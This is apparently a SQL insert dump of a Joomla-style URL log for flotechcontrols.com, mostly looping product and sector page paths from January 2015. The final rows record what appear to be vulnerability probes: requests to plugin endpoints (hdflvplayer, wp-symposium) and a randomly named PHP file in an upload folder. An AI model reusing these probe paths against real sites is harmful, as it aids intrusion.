(1389, 'http://www.flotechcontrols.com/products/tideflex/products/noreva', '', '', '', 1, 0, '2015-01-15 18:00:36', '0000-00-00 00:00:00'),
(1390, 'http://www.flotechcontrols.com/products/tideflex/products/valvtechnologies', '', '', '', 1, 0, '2015-01-15 18:00:38', '0000-00-00 00:00:00'),
(1391, 'http://www.flotechcontrols.com/products/tideflex/products/birkett', '', '', '', 1, 0, '2015-01-15 18:00:41', '0000-00-00 00:00:00'),
(1392, 'http://www.flotechcontrols.com/products/tideflex/products/sor', '', '', '', 1, 0, '2015-01-15 18:00:43', '0000-00-00 00:00:00'),
(1393, 'http://www.flotechcontrols.com/products/tideflex/products/mts', '', '', '', 1, 0, '2015-01-15 18:00:46', '0000-00-00 00:00:00'),
(1394, 'http://www.flotechcontrols.com/products/tideflex/products/copes', '', '', '', 1, 0, '2015-01-15 18:00:49', '0000-00-00 00:00:00'),
(1395, 'http://www.flotechcontrols.com/products/tideflex/application-sectors/power', '', '', '', 1, 0, '2015-01-15 18:00:51', '0000-00-00 00:00:00'),
(1396, 'http://www.flotechcontrols.com/products/tideflex/application-sectors/water', '', '', '', 1, 0, '2015-01-15 18:00:54', '0000-00-00 00:00:00'),
(1397, 'http://www.flotechcontrols.com/products/tideflex/application-sectors/mining', '', '', '', 1, 0, '2015-01-15 18:00:56', '0000-00-00 00:00:00'),
(1398, 'http://www.flotechcontrols.com/products/tideflex/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-15 18:00:59', '0000-00-00 00:00:00'),
(1399, 'http://www.flotechcontrols.com/products/tideflex/contact-us', '', '', '', 1, 0, '2015-01-15 18:01:02', '0000-00-00 00:00:00'),
(1400, 'http://www.flotechcontrols.com/products/wey/about-us', '', '', '', 1, 0, '2015-01-15 18:01:07', '0000-00-00 00:00:00'),
(1401, 'http://www.flotechcontrols.com/products/wey/products/red-valve', '', '', '', 1, 0, '2015-01-15 18:01:10', '0000-00-00 00:00:00'),
(1402, 'http://www.flotechcontrols.com/products/wey/products/tideflex', '', '', '', 1, 0, '2015-01-15 18:01:12', '0000-00-00 00:00:00'),
(1403, 'http://www.flotechcontrols.com/products/wey/products/wey', '', '', '', 1, 0, '2015-01-15 18:01:15', '0000-00-00 00:00:00'),
(1404, 'http://www.flotechcontrols.com/products/wey/products/noreva', '', '', '', 1, 0, '2015-01-15 18:01:18', '0000-00-00 00:00:00'),
(1405, 'http://www.flotechcontrols.com/products/wey/products/valvtechnologies', '', '', '', 1, 0, '2015-01-15 18:01:20', '0000-00-00 00:00:00'),
(1406, 'http://www.flotechcontrols.com/products/wey/products/birkett', '', '', '', 1, 0, '2015-01-15 18:01:23', '0000-00-00 00:00:00'),
(1407, 'http://www.flotechcontrols.com/products/wey/products/sor', '', '', '', 1, 0, '2015-01-15 18:01:26', '0000-00-00 00:00:00'),
(1408, 'http://www.flotechcontrols.com/products/wey/products/mts', '', '', '', 1, 0, '2015-01-15 18:01:28', '0000-00-00 00:00:00'),
(1409, 'http://www.flotechcontrols.com/products/wey/products/copes', '', '', '', 1, 0, '2015-01-15 18:01:31', '0000-00-00 00:00:00'),
(1410, 'http://www.flotechcontrols.com/products/wey/application-sectors/power', '', '', '', 1, 0, '2015-01-15 18:01:33', '0000-00-00 00:00:00'),
(1411, 'http://www.flotechcontrols.com/products/wey/application-sectors/water', '', '', '', 1, 0, '2015-01-15 18:01:36', '0000-00-00 00:00:00'),
(1412, 'http://www.flotechcontrols.com/products/wey/application-sectors/mining', '', '', '', 1, 0, '2015-01-15 18:01:38', '0000-00-00 00:00:00'),
(1413, 'http://www.flotechcontrols.com/products/wey/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-15 18:01:41', '0000-00-00 00:00:00'),
(1414, 'http://www.flotechcontrols.com/products/wey/contact-us', '', '', '', 1, 0, '2015-01-15 18:01:44', '0000-00-00 00:00:00'),
(1415, 'http://www.flotechcontrols.com/products/noreva/about-us', '', '', '', 1, 0, '2015-01-15 18:01:49', '0000-00-00 00:00:00'),
(1416, 'http://www.flotechcontrols.com/products/noreva/products/red-valve', '', '', '', 1, 0, '2015-01-15 18:01:52', '0000-00-00 00:00:00'),
(1417, 'http://www.flotechcontrols.com/products/noreva/products/tideflex', '', '', '', 1, 0, '2015-01-15 18:01:54', '0000-00-00 00:00:00'),
(1418, 'http://www.flotechcontrols.com/products/noreva/products/wey', '', '', '', 1, 0, '2015-01-15 18:01:57', '0000-00-00 00:00:00'),
(1419, 'http://www.flotechcontrols.com/products/noreva/products/noreva', '', '', '', 1, 0, '2015-01-15 18:02:00', '0000-00-00 00:00:00'),
(1420, 'http://www.flotechcontrols.com/products/noreva/products/valvtechnologies', '', '', '', 1, 0, '2015-01-15 18:02:02', '0000-00-00 00:00:00'),
(1421, 'http://www.flotechcontrols.com/products/noreva/products/birkett', '', '', '', 1, 0, '2015-01-15 18:02:05', '0000-00-00 00:00:00'),
(1422, 'http://www.flotechcontrols.com/products/noreva/products/sor', '', '', '', 1, 0, '2015-01-15 18:02:07', '0000-00-00 00:00:00'),
(1423, 'http://www.flotechcontrols.com/products/noreva/products/mts', '', '', '', 1, 0, '2015-01-15 18:02:10', '0000-00-00 00:00:00'),
(1424, 'http://www.flotechcontrols.com/products/noreva/products/copes', '', '', '', 1, 0, '2015-01-15 18:02:13', '0000-00-00 00:00:00'),
(1425, 'http://www.flotechcontrols.com/products/noreva/application-sectors/power', '', '', '', 1, 0, '2015-01-15 18:02:15', '0000-00-00 00:00:00'),
(1426, 'http://www.flotechcontrols.com/products/noreva/application-sectors/water', '', '', '', 1, 0, '2015-01-15 18:02:18', '0000-00-00 00:00:00'),
(1427, 'http://www.flotechcontrols.com/products/noreva/application-sectors/mining', '', '', '', 1, 0, '2015-01-15 18:02:20', '0000-00-00 00:00:00'),
(1428, 'http://www.flotechcontrols.com/products/noreva/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-15 18:02:23', '0000-00-00 00:00:00'),
(1429, 'http://www.flotechcontrols.com/products/noreva/contact-us', '', '', '', 1, 0, '2015-01-15 18:02:25', '0000-00-00 00:00:00'),
(1430, 'http://www.flotechcontrols.com/products/valvtechnologies/about-us', '', '', '', 1, 0, '2015-01-15 18:02:31', '0000-00-00 00:00:00'),
(1431, 'http://www.flotechcontrols.com/products/valvtechnologies/products/red-valve', '', '', '', 1, 0, '2015-01-15 18:02:33', '0000-00-00 00:00:00'),
(1432, 'http://www.flotechcontrols.com/products/valvtechnologies/products/tideflex', '', '', '', 1, 0, '2015-01-15 18:02:36', '0000-00-00 00:00:00'),
(1433, 'http://www.flotechcontrols.com/products/valvtechnologies/products/wey', '', '', '', 1, 0, '2015-01-15 18:02:39', '0000-00-00 00:00:00'),
(1434, 'http://www.flotechcontrols.com/products/valvtechnologies/products/noreva', '', '', '', 1, 0, '2015-01-15 18:02:42', '0000-00-00 00:00:00'),
(1435, 'http://www.flotechcontrols.com/products/valvtechnologies/products/valvtechnologies', '', '', '', 1, 0, '2015-01-15 18:02:44', '0000-00-00 00:00:00'),
(1436, 'http://www.flotechcontrols.com/products/valvtechnologies/products/birkett', '', '', '', 1, 0, '2015-01-15 18:02:47', '0000-00-00 00:00:00'),
(1437, 'http://www.flotechcontrols.com/products/valvtechnologies/products/sor', '', '', '', 1, 0, '2015-01-15 18:02:49', '0000-00-00 00:00:00'),
(1438, 'http://www.flotechcontrols.com/products/valvtechnologies/products/mts', '', '', '', 1, 0, '2015-01-15 18:02:52', '0000-00-00 00:00:00'),
(1439, 'http://www.flotechcontrols.com/products/valvtechnologies/products/copes', '', '', '', 1, 0, '2015-01-15 18:02:54', '0000-00-00 00:00:00'),
(1440, 'http://www.flotechcontrols.com/products/valvtechnologies/application-sectors/power', '', '', '', 1, 0, '2015-01-15 18:02:57', '0000-00-00 00:00:00'),
(1441, 'http://www.flotechcontrols.com/products/valvtechnologies/application-sectors/water', '', '', '', 1, 0, '2015-01-15 18:03:00', '0000-00-00 00:00:00'),
(1442, 'http://www.flotechcontrols.com/products/valvtechnologies/application-sectors/mining', '', '', '', 1, 0, '2015-01-15 18:03:02', '0000-00-00 00:00:00'),
(1443, 'http://www.flotechcontrols.com/products/valvtechnologies/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-15 18:03:05', '0000-00-00 00:00:00'),
(1444, 'http://www.flotechcontrols.com/products/valvtechnologies/contact-us', '', '', '', 1, 0, '2015-01-15 18:03:07', '0000-00-00 00:00:00'),
(1445, 'http://www.flotechcontrols.com/products/birkett/about-us', '', '', '', 1, 0, '2015-01-15 18:03:13', '0000-00-00 00:00:00'),
(1446, 'http://www.flotechcontrols.com/products/birkett/products/red-valve', '', '', '', 1, 0, '2015-01-15 18:03:15', '0000-00-00 00:00:00'),
(1447, 'http://www.flotechcontrols.com/products/birkett/products/tideflex', '', '', '', 1, 0, '2015-01-15 18:03:18', '0000-00-00 00:00:00'),
(1448, 'http://www.flotechcontrols.com/products/birkett/products/wey', '', '', '', 1, 0, '2015-01-15 18:03:21', '0000-00-00 00:00:00'),
(1449, 'http://www.flotechcontrols.com/products/birkett/products/noreva', '', '', '', 1, 0, '2015-01-15 18:03:23', '0000-00-00 00:00:00'),
(1450, 'http://www.flotechcontrols.com/products/birkett/products/valvtechnologies', '', '', '', 1, 0, '2015-01-15 18:03:26', '0000-00-00 00:00:00'),
(1451, 'http://www.flotechcontrols.com/products/birkett/products/birkett', '', '', '', 1, 0, '2015-01-15 18:03:28', '0000-00-00 00:00:00'),
(1452, 'http://www.flotechcontrols.com/products/birkett/products/sor', '', '', '', 1, 0, '2015-01-15 18:03:31', '0000-00-00 00:00:00'),
(1453, 'http://www.flotechcontrols.com/products/birkett/products/mts', '', '', '', 1, 0, '2015-01-15 18:03:34', '0000-00-00 00:00:00'),
(1454, 'http://www.flotechcontrols.com/products/birkett/products/copes', '', '', '', 1, 0, '2015-01-15 18:03:36', '0000-00-00 00:00:00'),
(1455, 'http://www.flotechcontrols.com/products/birkett/application-sectors/power', '', '', '', 1, 0, '2015-01-15 18:03:39', '0000-00-00 00:00:00'),
(1456, 'http://www.flotechcontrols.com/products/birkett/application-sectors/water', '', '', '', 1, 0, '2015-01-15 18:03:41', '0000-00-00 00:00:00'),
(1457, 'http://www.flotechcontrols.com/products/birkett/application-sectors/mining', '', '', '', 1, 0, '2015-01-15 18:03:44', '0000-00-00 00:00:00'),
(1458, 'http://www.flotechcontrols.com/products/birkett/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-15 18:03:47', '0000-00-00 00:00:00'),
(1459, 'http://www.flotechcontrols.com/products/birkett/contact-us', '', '', '', 1, 0, '2015-01-15 18:03:49', '0000-00-00 00:00:00'),
(1460, 'http://www.flotechcontrols.com/products/sor/about-us', '', '', '', 1, 0, '2015-01-15 18:03:55', '0000-00-00 00:00:00'),
(1461, 'http://www.flotechcontrols.com/products/sor/products/red-valve', '', '', '', 1, 0, '2015-01-15 18:03:57', '0000-00-00 00:00:00'),
(1462, 'http://www.flotechcontrols.com/products/sor/products/tideflex', '', '', '', 1, 0, '2015-01-15 18:04:00', '0000-00-00 00:00:00'),
(1463, 'http://www.flotechcontrols.com/products/sor/products/wey', '', '', '', 1, 0, '2015-01-15 18:04:02', '0000-00-00 00:00:00'),
(1464, 'http://www.flotechcontrols.com/products/sor/products/noreva', '', '', '', 1, 0, '2015-01-15 18:04:05', '0000-00-00 00:00:00'),
(1465, 'http://www.flotechcontrols.com/products/sor/products/valvtechnologies', '', '', '', 1, 0, '2015-01-15 18:04:08', '0000-00-00 00:00:00'),
(1466, 'http://www.flotechcontrols.com/products/sor/products/birkett', '', '', '', 1, 0, '2015-01-15 18:04:10', '0000-00-00 00:00:00'),
(1467, 'http://www.flotechcontrols.com/products/sor/products/sor', '', '', '', 1, 0, '2015-01-15 18:04:13', '0000-00-00 00:00:00'),
(1468, 'http://www.flotechcontrols.com/products/sor/products/mts', '', '', '', 1, 0, '2015-01-15 18:04:15', '0000-00-00 00:00:00'),
(1469, 'http://www.flotechcontrols.com/products/sor/products/copes', '', '', '', 1, 0, '2015-01-15 18:04:18', '0000-00-00 00:00:00'),
(1470, 'http://www.flotechcontrols.com/products/sor/application-sectors/power', '', '', '', 1, 0, '2015-01-15 18:04:20', '0000-00-00 00:00:00'),
(1471, 'http://www.flotechcontrols.com/products/sor/application-sectors/water', '', '', '', 1, 0, '2015-01-15 18:04:23', '0000-00-00 00:00:00'),
(1472, 'http://www.flotechcontrols.com/products/sor/application-sectors/mining', '', '', '', 1, 0, '2015-01-15 18:04:26', '0000-00-00 00:00:00'),
(1473, 'http://www.flotechcontrols.com/products/sor/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-15 18:04:28', '0000-00-00 00:00:00'),
(1474, 'http://www.flotechcontrols.com/products/sor/contact-us', '', '', '', 1, 0, '2015-01-15 18:04:31', '0000-00-00 00:00:00'),
(1475, 'http://www.flotechcontrols.com/products/mts/about-us', '', '', '', 1, 0, '2015-01-15 18:04:36', '0000-00-00 00:00:00'),
(1476, 'http://www.flotechcontrols.com/products/mts/products/red-valve', '', '', '', 1, 0, '2015-01-15 18:04:39', '0000-00-00 00:00:00'),
(1477, 'http://www.flotechcontrols.com/products/mts/products/tideflex', '', '', '', 1, 0, '2015-01-15 18:04:41', '0000-00-00 00:00:00'),
(1478, 'http://www.flotechcontrols.com/products/mts/products/wey', '', '', '', 1, 0, '2015-01-15 18:04:44', '0000-00-00 00:00:00'),
(1479, 'http://www.flotechcontrols.com/products/mts/products/noreva', '', '', '', 1, 0, '2015-01-15 18:04:47', '0000-00-00 00:00:00'),
(1480, 'http://www.flotechcontrols.com/products/mts/products/valvtechnologies', '', '', '', 1, 0, '2015-01-15 18:04:49', '0000-00-00 00:00:00'),
(1481, 'http://www.flotechcontrols.com/products/mts/products/birkett', '', '', '', 1, 0, '2015-01-15 18:04:52', '0000-00-00 00:00:00'),
(1482, 'http://www.flotechcontrols.com/products/mts/products/sor', '', '', '', 1, 0, '2015-01-15 18:04:54', '0000-00-00 00:00:00'),
(1483, 'http://www.flotechcontrols.com/products/mts/products/mts', '', '', '', 1, 0, '2015-01-15 18:04:57', '0000-00-00 00:00:00'),
(1484, 'http://www.flotechcontrols.com/products/mts/products/copes', '', '', '', 1, 0, '2015-01-15 18:05:00', '0000-00-00 00:00:00'),
(1485, 'http://www.flotechcontrols.com/products/mts/application-sectors/power', '', '', '', 1, 0, '2015-01-15 18:05:02', '0000-00-00 00:00:00'),
(1486, 'http://www.flotechcontrols.com/products/mts/application-sectors/water', '', '', '', 1, 0, '2015-01-15 18:05:05', '0000-00-00 00:00:00'),
(1487, 'http://www.flotechcontrols.com/products/mts/application-sectors/mining', '', '', '', 1, 0, '2015-01-15 18:05:07', '0000-00-00 00:00:00'),
(1488, 'http://www.flotechcontrols.com/products/mts/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-15 18:05:10', '0000-00-00 00:00:00'),
(1489, 'http://www.flotechcontrols.com/products/mts/contact-us', '', '', '', 1, 0, '2015-01-15 18:05:13', '0000-00-00 00:00:00'),
(1490, 'http://www.flotechcontrols.com/products/copes/about-us', '', '', '', 1, 0, '2015-01-15 18:05:18', '0000-00-00 00:00:00'),
(1491, 'http://www.flotechcontrols.com/products/copes/products/red-valve', '', '', '', 1, 0, '2015-01-15 18:05:21', '0000-00-00 00:00:00'),
(1492, 'http://www.flotechcontrols.com/products/copes/products/tideflex', '', '', '', 1, 0, '2015-01-15 18:05:24', '0000-00-00 00:00:00'),
(1493, 'http://www.flotechcontrols.com/products/copes/products/wey', '', '', '', 1, 0, '2015-01-15 18:05:26', '0000-00-00 00:00:00'),
(1494, 'http://www.flotechcontrols.com/products/copes/products/noreva', '', '', '', 1, 0, '2015-01-15 18:05:29', '0000-00-00 00:00:00'),
(1495, 'http://www.flotechcontrols.com/products/copes/products/valvtechnologies', '', '', '', 1, 0, '2015-01-15 18:05:31', '0000-00-00 00:00:00'),
(1496, 'http://www.flotechcontrols.com/products/copes/products/birkett', '', '', '', 1, 0, '2015-01-15 18:05:34', '0000-00-00 00:00:00'),
(1497, 'http://www.flotechcontrols.com/products/copes/products/sor', '', '', '', 1, 0, '2015-01-15 18:05:37', '0000-00-00 00:00:00'),
(1498, 'http://www.flotechcontrols.com/products/copes/products/mts', '', '', '', 1, 0, '2015-01-15 18:05:39', '0000-00-00 00:00:00'),
(1499, 'http://www.flotechcontrols.com/products/copes/products/copes', '', '', '', 1, 0, '2015-01-15 18:05:42', '0000-00-00 00:00:00'),
(1500, 'http://www.flotechcontrols.com/products/copes/application-sectors/power', '', '', '', 1, 0, '2015-01-15 18:05:44', '0000-00-00 00:00:00'),
(1501, 'http://www.flotechcontrols.com/products/copes/application-sectors/water', '', '', '', 1, 0, '2015-01-15 18:05:47', '0000-00-00 00:00:00'),
(1502, 'http://www.flotechcontrols.com/products/copes/application-sectors/mining', '', '', '', 1, 0, '2015-01-15 18:05:50', '0000-00-00 00:00:00'),
(1503, 'http://www.flotechcontrols.com/products/copes/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-15 18:05:52', '0000-00-00 00:00:00'),
(1504, 'http://www.flotechcontrols.com/products/copes/contact-us', '', '', '', 1, 0, '2015-01-15 18:05:55', '0000-00-00 00:00:00'),
(1505, 'http://www.flotechcontrols.com/application-sectors/power/about-us', '', '', '', 1, 0, '2015-01-15 18:06:01', '0000-00-00 00:00:00'),
(1506, 'http://www.flotechcontrols.com/application-sectors/power/products/red-valve', '', '', '', 1, 0, '2015-01-15 18:06:03', '0000-00-00 00:00:00'),
(1507, 'http://www.flotechcontrols.com/application-sectors/power/products/tideflex', '', '', '', 1, 0, '2015-01-15 18:06:06', '0000-00-00 00:00:00'),
(1508, 'http://www.flotechcontrols.com/application-sectors/power/products/wey', '', '', '', 1, 0, '2015-01-15 18:06:08', '0000-00-00 00:00:00'),
(1509, 'http://www.flotechcontrols.com/application-sectors/power/products/noreva', '', '', '', 1, 0, '2015-01-15 18:06:11', '0000-00-00 00:00:00'),
(1510, 'http://www.flotechcontrols.com/application-sectors/power/products/valvtechnologies', '', '', '', 1, 0, '2015-01-15 18:06:14', '0000-00-00 00:00:00'),
(1511, 'http://www.flotechcontrols.com/application-sectors/power/products/birkett', '', '', '', 1, 0, '2015-01-15 18:06:16', '0000-00-00 00:00:00'),
(1512, 'http://www.flotechcontrols.com/application-sectors/power/products/sor', '', '', '', 1, 0, '2015-01-15 18:06:19', '0000-00-00 00:00:00'),
(1513, 'http://www.flotechcontrols.com/application-sectors/power/products/mts', '', '', '', 1, 0, '2015-01-15 18:06:21', '0000-00-00 00:00:00'),
(1514, 'http://www.flotechcontrols.com/application-sectors/power/products/copes', '', '', '', 1, 0, '2015-01-15 18:06:24', '0000-00-00 00:00:00'),
(1515, 'http://www.flotechcontrols.com/application-sectors/power/application-sectors/power', '', '', '', 1, 0, '2015-01-15 18:06:26', '0000-00-00 00:00:00'),
(1516, 'http://www.flotechcontrols.com/application-sectors/power/application-sectors/water', '', '', '', 1, 0, '2015-01-15 18:06:29', '0000-00-00 00:00:00'),
(1517, 'http://www.flotechcontrols.com/application-sectors/power/application-sectors/mining', '', '', '', 1, 0, '2015-01-15 18:06:32', '0000-00-00 00:00:00'),
(1518, 'http://www.flotechcontrols.com/application-sectors/power/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-15 18:06:34', '0000-00-00 00:00:00'),
(1519, 'http://www.flotechcontrols.com/application-sectors/power/contact-us', '', '', '', 1, 0, '2015-01-15 18:06:37', '0000-00-00 00:00:00'),
(1520, 'http://www.flotechcontrols.com/application-sectors/water/about-us', '', '', '', 1, 0, '2015-01-15 18:06:43', '0000-00-00 00:00:00'),
(1521, 'http://www.flotechcontrols.com/application-sectors/water/products/red-valve', '', '', '', 1, 0, '2015-01-15 18:06:45', '0000-00-00 00:00:00'),
(1522, 'http://www.flotechcontrols.com/application-sectors/water/products/tideflex', '', '', '', 1, 0, '2015-01-15 18:06:48', '0000-00-00 00:00:00'),
(1523, 'http://www.flotechcontrols.com/application-sectors/water/products/wey', '', '', '', 1, 0, '2015-01-15 18:06:51', '0000-00-00 00:00:00'),
(1524, 'http://www.flotechcontrols.com/application-sectors/water/products/noreva', '', '', '', 1, 0, '2015-01-15 18:06:53', '0000-00-00 00:00:00'),
(1525, 'http://www.flotechcontrols.com/application-sectors/water/products/valvtechnologies', '', '', '', 1, 0, '2015-01-15 18:06:56', '0000-00-00 00:00:00'),
(1526, 'http://www.flotechcontrols.com/application-sectors/water/products/birkett', '', '', '', 1, 0, '2015-01-15 18:06:58', '0000-00-00 00:00:00'),
(1527, 'http://www.flotechcontrols.com/application-sectors/water/products/sor', '', '', '', 1, 0, '2015-01-15 18:07:01', '0000-00-00 00:00:00'),
(1528, 'http://www.flotechcontrols.com/application-sectors/water/products/mts', '', '', '', 1, 0, '2015-01-15 18:07:04', '0000-00-00 00:00:00'),
(1529, 'http://www.flotechcontrols.com/application-sectors/water/products/copes', '', '', '', 1, 0, '2015-01-15 18:07:07', '0000-00-00 00:00:00'),
(1530, 'http://www.flotechcontrols.com/application-sectors/water/application-sectors/power', '', '', '', 1, 0, '2015-01-15 18:07:09', '0000-00-00 00:00:00'),
(1531, 'http://www.flotechcontrols.com/application-sectors/water/application-sectors/water', '', '', '', 1, 0, '2015-01-15 18:07:12', '0000-00-00 00:00:00'),
(1532, 'http://www.flotechcontrols.com/application-sectors/water/application-sectors/mining', '', '', '', 1, 0, '2015-01-15 18:07:15', '0000-00-00 00:00:00'),
(1533, 'http://www.flotechcontrols.com/application-sectors/water/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-15 18:07:17', '0000-00-00 00:00:00'),
(1534, 'http://www.flotechcontrols.com/application-sectors/water/contact-us', '', '', '', 1, 0, '2015-01-15 18:07:20', '0000-00-00 00:00:00'),
(1535, 'http://www.flotechcontrols.com/application-sectors/mining/about-us', '', '', '', 1, 0, '2015-01-15 18:07:25', '0000-00-00 00:00:00'),
(1536, 'http://www.flotechcontrols.com/application-sectors/mining/products/red-valve', '', '', '', 1, 0, '2015-01-15 18:07:28', '0000-00-00 00:00:00'),
(1537, 'http://www.flotechcontrols.com/application-sectors/mining/products/tideflex', '', '', '', 1, 0, '2015-01-15 18:07:31', '0000-00-00 00:00:00'),
(1538, 'http://www.flotechcontrols.com/application-sectors/mining/products/wey', '', '', '', 1, 0, '2015-01-15 18:07:33', '0000-00-00 00:00:00'),
(1539, 'http://www.flotechcontrols.com/application-sectors/mining/products/noreva', '', '', '', 1, 0, '2015-01-15 18:07:36', '0000-00-00 00:00:00'),
(1540, 'http://www.flotechcontrols.com/application-sectors/mining/products/valvtechnologies', '', '', '', 1, 0, '2015-01-15 18:07:38', '0000-00-00 00:00:00'),
(1541, 'http://www.flotechcontrols.com/application-sectors/mining/products/birkett', '', '', '', 1, 0, '2015-01-15 18:07:41', '0000-00-00 00:00:00'),
(1542, 'http://www.flotechcontrols.com/application-sectors/mining/products/sor', '', '', '', 1, 0, '2015-01-15 18:07:44', '0000-00-00 00:00:00'),
(1543, 'http://www.flotechcontrols.com/application-sectors/mining/products/mts', '', '', '', 1, 0, '2015-01-15 18:07:46', '0000-00-00 00:00:00'),
(1544, 'http://www.flotechcontrols.com/application-sectors/mining/products/copes', '', '', '', 1, 0, '2015-01-15 18:07:49', '0000-00-00 00:00:00'),
(1545, 'http://www.flotechcontrols.com/application-sectors/mining/application-sectors/power', '', '', '', 1, 0, '2015-01-15 18:07:51', '0000-00-00 00:00:00'),
(1546, 'http://www.flotechcontrols.com/application-sectors/mining/application-sectors/water', '', '', '', 1, 0, '2015-01-15 18:07:54', '0000-00-00 00:00:00'),
(1547, 'http://www.flotechcontrols.com/application-sectors/mining/application-sectors/mining', '', '', '', 1, 0, '2015-01-15 18:07:57', '0000-00-00 00:00:00'),
(1548, 'http://www.flotechcontrols.com/application-sectors/mining/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-15 18:07:59', '0000-00-00 00:00:00'),
(1549, 'http://www.flotechcontrols.com/application-sectors/mining/contact-us', '', '', '', 1, 0, '2015-01-15 18:08:02', '0000-00-00 00:00:00'),
(1550, 'http://www.flotechcontrols.com/application-sectors/oil-and-gas/about-us', '', '', '', 1, 0, '2015-01-15 18:08:07', '0000-00-00 00:00:00'),
(1551, 'http://www.flotechcontrols.com/application-sectors/oil-and-gas/products/red-valve', '', '', '', 1, 0, '2015-01-15 18:08:10', '0000-00-00 00:00:00'),
(1552, 'http://www.flotechcontrols.com/application-sectors/oil-and-gas/products/tideflex', '', '', '', 1, 0, '2015-01-15 18:08:13', '0000-00-00 00:00:00'),
(1553, 'http://www.flotechcontrols.com/application-sectors/oil-and-gas/products/wey', '', '', '', 1, 0, '2015-01-15 18:08:15', '0000-00-00 00:00:00'),
(1554, 'http://www.flotechcontrols.com/application-sectors/oil-and-gas/products/noreva', '', '', '', 1, 0, '2015-01-15 18:08:18', '0000-00-00 00:00:00'),
(1555, 'http://www.flotechcontrols.com/application-sectors/oil-and-gas/products/valvtechnologies', '', '', '', 1, 0, '2015-01-15 18:08:20', '0000-00-00 00:00:00'),
(1556, 'http://www.flotechcontrols.com/application-sectors/oil-and-gas/products/birkett', '', '', '', 1, 0, '2015-01-15 18:08:23', '0000-00-00 00:00:00'),
(1557, 'http://www.flotechcontrols.com/application-sectors/oil-and-gas/products/sor', '', '', '', 1, 0, '2015-01-15 18:08:26', '0000-00-00 00:00:00'),
(1558, 'http://www.flotechcontrols.com/application-sectors/oil-and-gas/products/mts', '', '', '', 1, 0, '2015-01-15 18:08:28', '0000-00-00 00:00:00'),
(1559, 'http://www.flotechcontrols.com/application-sectors/oil-and-gas/products/copes', '', '', '', 1, 0, '2015-01-15 18:08:31', '0000-00-00 00:00:00'),
(1560, 'http://www.flotechcontrols.com/application-sectors/oil-and-gas/application-sectors/power', '', '', '', 1, 0, '2015-01-15 18:08:33', '0000-00-00 00:00:00'),
(1561, 'http://www.flotechcontrols.com/application-sectors/oil-and-gas/application-sectors/water', '', '', '', 1, 0, '2015-01-15 18:08:36', '0000-00-00 00:00:00'),
(1562, 'http://www.flotechcontrols.com/application-sectors/oil-and-gas/application-sectors/mining', '', '', '', 1, 0, '2015-01-15 18:08:39', '0000-00-00 00:00:00'),
(1563, 'http://www.flotechcontrols.com/application-sectors/oil-and-gas/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-15 18:08:41', '0000-00-00 00:00:00'),
(1564, 'http://www.flotechcontrols.com/application-sectors/oil-and-gas/contact-us', '', '', '', 1, 0, '2015-01-15 18:08:44', '0000-00-00 00:00:00'),
(1565, 'http://www.flotechcontrols.com/contact-us/about-us', '', '', '', 1, 0, '2015-01-15 18:08:49', '0000-00-00 00:00:00'),
(1566, 'http://www.flotechcontrols.com/contact-us/products/red-valve', '', '', '', 1, 0, '2015-01-15 18:08:52', '0000-00-00 00:00:00'),
(1567, 'http://www.flotechcontrols.com/contact-us/products/tideflex', '', '', '', 1, 0, '2015-01-15 18:08:55', '0000-00-00 00:00:00'),
(1568, 'http://www.flotechcontrols.com/contact-us/products/wey', '', '', '', 1, 0, '2015-01-15 18:08:57', '0000-00-00 00:00:00'),
(1569, 'http://www.flotechcontrols.com/contact-us/products/noreva', '', '', '', 1, 0, '2015-01-15 18:09:00', '0000-00-00 00:00:00'),
(1570, 'http://www.flotechcontrols.com/contact-us/products/valvtechnologies', '', '', '', 1, 0, '2015-01-15 18:09:02', '0000-00-00 00:00:00'),
(1571, 'http://www.flotechcontrols.com/contact-us/products/birkett', '', '', '', 1, 0, '2015-01-15 18:09:05', '0000-00-00 00:00:00'),
(1572, 'http://www.flotechcontrols.com/contact-us/products/sor', '', '', '', 1, 0, '2015-01-15 18:09:08', '0000-00-00 00:00:00'),
(1573, 'http://www.flotechcontrols.com/contact-us/products/mts', '', '', '', 1, 0, '2015-01-15 18:09:10', '0000-00-00 00:00:00'),
(1574, 'http://www.flotechcontrols.com/contact-us/products/copes', '', '', '', 1, 0, '2015-01-15 18:09:13', '0000-00-00 00:00:00'),
(1575, 'http://www.flotechcontrols.com/contact-us/application-sectors/power', '', '', '', 1, 0, '2015-01-15 18:09:16', '0000-00-00 00:00:00'),
(1576, 'http://www.flotechcontrols.com/contact-us/application-sectors/water', '', '', '', 1, 0, '2015-01-15 18:09:18', '0000-00-00 00:00:00'),
(1577, 'http://www.flotechcontrols.com/contact-us/application-sectors/mining', '', '', '', 1, 0, '2015-01-15 18:09:21', '0000-00-00 00:00:00'),
(1578, 'http://www.flotechcontrols.com/contact-us/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-15 18:09:23', '0000-00-00 00:00:00'),
(1579, 'http://www.flotechcontrols.com/contact-us/contact-us', '', '', '', 1, 0, '2015-01-15 18:09:26', '0000-00-00 00:00:00'),
(1580, 'http://flotechcontrols.com/media/sysm.php', '', '', '', 1, 0, '2015-01-17 07:22:50', '0000-00-00 00:00:00'),
(1581, 'http://www.flotechcontrols.com/wp-admin/admin-ajax.php', '', '', '', 1, 0, '2015-01-17 08:21:59', '0000-00-00 00:00:00'),
(1582, 'http://www.flotechcontrols.com/components/com_hdflvplayer/hdflvplayer/download.php', '', '', '', 1, 0, '2015-01-17 08:22:00', '0000-00-00 00:00:00'),
(1583, 'http://www.flotechcontrols.com/wp-content/plugins/wp-symposium/server/php/index.php', '', '', '', 1, 0, '2015-01-17 13:29:17', '0000-00-00 00:00:00'),
(1584, 'http://www.flotechcontrols.com/wp-content/plugins/wp-symposium/server/php/utEobmCBpHayOS.php', '', '', '', 1, 0, '2015-01-17 13:29:18', '0000-00-00 00:00:00'),
